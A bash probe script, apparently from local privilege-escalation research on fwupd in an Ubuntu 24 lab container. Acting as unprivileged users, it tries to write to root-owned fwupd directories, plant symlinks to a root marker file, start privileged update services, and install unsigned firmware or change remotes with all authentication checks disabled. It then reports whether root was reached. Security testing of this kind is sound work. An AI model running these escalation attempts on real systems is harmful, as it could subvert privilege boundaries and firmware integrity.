#!/usr/bin/env bash
set -uo pipefail

TARGET_CONTAINER="${1:-${TARGET_CONTAINER:-ubuntu24-server-lpe-target}}"

section() {
  printf '\n## %s\n' "$*"
}

if ! docker inspect "$TARGET_CONTAINER" >/dev/null 2>&1; then
  echo "missing container: $TARGET_CONTAINER" >&2
  exit 1
fi

section "host/container"
date -u '+utc=%Y-%m-%dT%H:%M:%SZ'
docker ps --filter "name=^/${TARGET_CONTAINER}$" --format 'container={{.Names}} image={{.Image}} status={{.Status}}'

docker exec -i "$TARGET_CONTAINER" bash -s <<'TARGET_SH'
set +e
umask 077

T=24
tmp="$(mktemp -d /tmp/fwupd-refresh-offline-deep.XXXXXX)"
chmod 755 "$tmp"
root_marker="/root/fwupd_refresh_offline_deep_root"

section() {
  printf '\n## %s\n' "$*"
}

run() {
  printf '\n$ %s\n' "$*"
  timeout "$T" bash -lc "$*" 2>&1
  printf '[rc=%s]\n' "$?"
}

run_user() {
  local user="$1"
  shift
  printf '\n$ runuser -u %s -- %s\n' "$user" "$*"
  timeout "$T" runuser -u "$user" -- bash -lc "$*" 2>&1
  printf '[rc=%s]\n' "$?"
}

cleanup() {
  pkill -TERM -u selfauth fwupdmgr 2>/dev/null || true
  pkill -TERM -u selfauth busctl 2>/dev/null || true
  pkill -TERM -u selfauth systemctl 2>/dev/null || true
  rm -rf "$tmp"
}
trap cleanup EXIT

section "target identity and package proof"
cat /etc/os-release
uname -a
id attacker
id selfauth
getent passwd fwupd-refresh || true
getent group fwupd-refresh sudo adm plugdev 2>/dev/null || true
dpkg-query -W -f='${binary:Package}\t${Version}\n' \
  fwupd fwupd-signed libfwupd2 libjcat1 libarchive13t64 dbus systemd polkitd 2>/dev/null | sort

section "default unit, bus, and policy proof"
systemctl show fwupd.service fwupd-refresh.timer fwupd-refresh.service fwupd-offline-update.service \
  -p Id -p LoadState -p ActiveState -p SubState -p UnitFileState -p FragmentPath \
  -p ConditionResult -p Result -p User -p ExecStart -p StateDirectory -p CacheDirectory \
  -p ConfigurationDirectory --no-pager 2>/dev/null
printf '\n[system bus]\n'
busctl --system --no-pager list 2>/dev/null | awk '/fwupd|PolicyKit/{print}'
for f in \
  /usr/lib/systemd/system/fwupd.service \
  /usr/lib/systemd/system/fwupd-refresh.timer \
  /usr/lib/systemd/system/fwupd-refresh.service \
  /usr/lib/systemd/system/fwupd-offline-update.service \
  /usr/share/dbus-1/system-services/org.freedesktop.fwupd.service \
  /usr/share/dbus-1/system.d/org.freedesktop.fwupd.conf; do
  printf '\n[file %s]\n' "$f"
  [ -e "$f" ] && nl -ba "$f" | sed -n '1,120p' || echo "missing"
done
printf '\n[fwupd polkit action summary]\n'
python3 - <<'PY'
import xml.etree.ElementTree as ET
p = "/usr/share/polkit-1/actions/org.freedesktop.fwupd.policy"
root = ET.parse(p).getroot()
for action in root.findall("action"):
    aid = action.attrib.get("id", "")
    if not aid.startswith("org.freedesktop.fwupd."):
        continue
    defaults = action.find("defaults")
    vals = []
    for key in ("allow_any", "allow_inactive", "allow_active"):
        node = defaults.find(key) if defaults is not None else None
        vals.append(node.text if node is not None else "")
    implies = [
        node.text or ""
        for node in action.findall("annotate")
        if node.attrib.get("key") == "org.freedesktop.policykit.imply"
    ]
    print(f"{aid}\tany={vals[0]}\tinactive={vals[1]}\tactive={vals[2]}\timply={','.join(implies)}")
PY

section "default fwupd state directories"
for p in /var/lib/fwupd /var/cache/fwupd /var/cache/fwupdmgr /run/fwupd /run/motd.d /etc/fwupd /usr/libexec/fwupd; do
  printf '\n[path %s]\n' "$p"
  ls -ld "$p" 2>&1 || true
  find "$p" -maxdepth 2 -printf '%M %u %g %p -> %l\n' 2>/dev/null | sort | sed -n '1,120p'
done

section "attacker write and systemd trigger attempts"
run_user attacker "mkdir -p /var/lib/fwupd"
run_user attacker "touch /var/lib/fwupd/pending.db"
run_user attacker "mkdir -p /var/cache/fwupdmgr && touch /var/cache/fwupdmgr/attacker"
run_user attacker "ln -s '$root_marker' /var/lib/fwupd/pending.db"
run_user attacker "ln -s '$root_marker' /system-update"
run_user attacker "systemctl --no-ask-password start fwupd-refresh.service"
run_user attacker "systemctl --no-ask-password start fwupd-offline-update.service"
run_user attacker "systemctl --no-ask-password start system-update.target"

section "attacker D-Bus, refresh, offline, and local-file methods"
printf '<components><component type="firmware"><id>com.example.fwupd.refresh.deep</id></component></components>\n' > "$tmp/metadata.xml"
gzip -c "$tmp/metadata.xml" > "$tmp/metadata.xml.gz"
printf 'not a real signature\n' > "$tmp/metadata.xml.gz.asc"
printf 'firmware payload\n' > "$tmp/payload.bin"
sha="$(sha256sum "$tmp/payload.bin" | awk '{print $1}')"
cat > "$tmp/payload.metainfo.xml" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<component type="firmware">
  <id>com.example.fwupd-refresh-offline-deep.payload</id>
  <name>fwupd refresh offline deep payload</name>
  <summary>fwupd refresh offline deep payload</summary>
  <description><p>Probe metadata for default root-boundary testing.</p></description>
  <provides>
    <firmware type="flashed">11111111-2222-3333-4444-555555555555</firmware>
  </provides>
  <releases>
    <release version="1.0" date="2026-05-16">
      <checksum target="content" filename="payload.bin" type="sha256">$sha</checksum>
    </release>
  </releases>
</component>
EOF
timeout "$T" fwupdtool build-cabinet "$tmp/payload.cab" "$tmp/payload.bin" "$tmp/payload.metainfo.xml" 2>&1
printf '[build-cabinet rc=%s]\n' "$?"
chown -R attacker:attacker "$tmp"
ls -l "$tmp"
run_user attacker "busctl --system --timeout=8 call org.freedesktop.fwupd / org.freedesktop.DBus.Peer Ping"
run_user attacker "fwupdmgr --version"
run_user attacker "fwupdmgr --no-authenticate get-remotes"
run_user attacker "fwupdmgr --no-authenticate refresh '$tmp/metadata.xml.gz' '$tmp/metadata.xml.gz.asc' lvfs"
run_user attacker "fwupdmgr --assume-yes --no-authenticate --no-metadata-check --no-reboot-check --no-device-prompt local-install '$tmp/payload.cab'"
run_user attacker "fwupdmgr --offline --assume-yes --no-authenticate --no-metadata-check --no-reboot-check --no-device-prompt local-install '$tmp/payload.cab'"
run_user attacker "fwupdmgr --no-authenticate modify-remote lvfs Enabled false"
run_user attacker "fwupdmgr --no-authenticate modify-config DisabledDevices fwupd-refresh-offline-deep"
run_user attacker "fwupdtool get-details '$tmp/payload.cab'"
run_user attacker "fwupdtool refresh"
run_user attacker "fwupdtool reboot-cleanup"

section "active non-admin selfauth checks"
cat > "$tmp/selfauth-inner.sh" <<'EOF'
#!/usr/bin/env bash
set +e
T=24
meta="$1"
sig="$2"
cab="$3"
marker="$4"
run_cmd() {
  echo
  echo "$ $*"
  timeout "$T" bash -lc "$*" 2>&1
  echo "[rc=$?]"
}
echo "[identity]"
id
tty || true
echo "XDG_SESSION_ID=${XDG_SESSION_ID:-}"
if [ -n "${XDG_SESSION_ID:-}" ]; then
  loginctl show-session "$XDG_SESSION_ID" -p Active -p Remote -p Type -p Class -p State -p Name -p User -p TTY 2>/dev/null || true
fi
for action in \
  org.freedesktop.fwupd.update-internal-trusted \
  org.freedesktop.fwupd.update-hotplug-trusted \
  org.freedesktop.fwupd.modify-remote \
  org.freedesktop.fwupd.modify-config; do
  run_cmd "pkcheck --action-id '$action' --process $$"
done
run_cmd "mkdir -p /var/lib/fwupd"
run_cmd "touch /var/lib/fwupd/pending.db"
run_cmd "ln -s '$marker' /var/lib/fwupd/pending.db"
run_cmd "ln -s '$marker' /system-update"
run_cmd "systemctl --no-ask-password start fwupd-refresh.service"
run_cmd "systemctl --no-ask-password start fwupd-offline-update.service"
run_cmd "systemctl --no-ask-password start system-update.target"
run_cmd "busctl --system --timeout=8 call org.freedesktop.fwupd / org.freedesktop.DBus.Peer Ping"
run_cmd "fwupdmgr --no-authenticate get-remotes"
run_cmd "fwupdmgr --no-authenticate refresh '$meta' '$sig' lvfs"
run_cmd "fwupdmgr --assume-yes --no-authenticate --no-metadata-check --no-reboot-check --no-device-prompt local-install '$cab'"
run_cmd "fwupdmgr --offline --assume-yes --no-authenticate --no-metadata-check --no-reboot-check --no-device-prompt local-install '$cab'"
run_cmd "fwupdmgr --no-authenticate modify-remote lvfs Enabled false"
run_cmd "fwupdmgr --no-authenticate modify-config DisabledDevices fwupd-refresh-offline-deep"
EOF
chmod 755 "$tmp/selfauth-inner.sh"
chown selfauth:selfauth "$tmp/selfauth-inner.sh" "$tmp/metadata.xml.gz" "$tmp/metadata.xml.gz.asc" "$tmp/payload.cab"
cat > "$tmp/selfauth-input" <<EOF
$tmp/selfauth-inner.sh $tmp/metadata.xml.gz $tmp/metadata.xml.gz.asc $tmp/payload.cab $root_marker
exit
EOF
timeout 170 script -q -e -c "su - selfauth" /dev/null < "$tmp/selfauth-input" 2>&1
printf '[active-selfauth rc=%s]\n' "$?"

section "post-checks and root proof"
systemctl show fwupd.service fwupd-refresh.timer fwupd-refresh.service fwupd-offline-update.service \
  -p ActiveState -p SubState -p Result -p ConditionResult --no-pager 2>/dev/null
find /var/lib/fwupd /var/cache/fwupd /var/cache/fwupdmgr /run/fwupd /run/motd.d -maxdepth 2 \
  -printf '%M %u %g %p -> %l\n' 2>/dev/null | sort
if [ -e "$root_marker" ]; then
  echo "ROOT_PROOF=YES"
  ls -l "$root_marker"
  cat "$root_marker" 2>/dev/null || true
else
  echo "ROOT_PROOF=NO"
fi
systemctl is-system-running
systemctl --failed --no-legend | wc -l
TARGET_SH
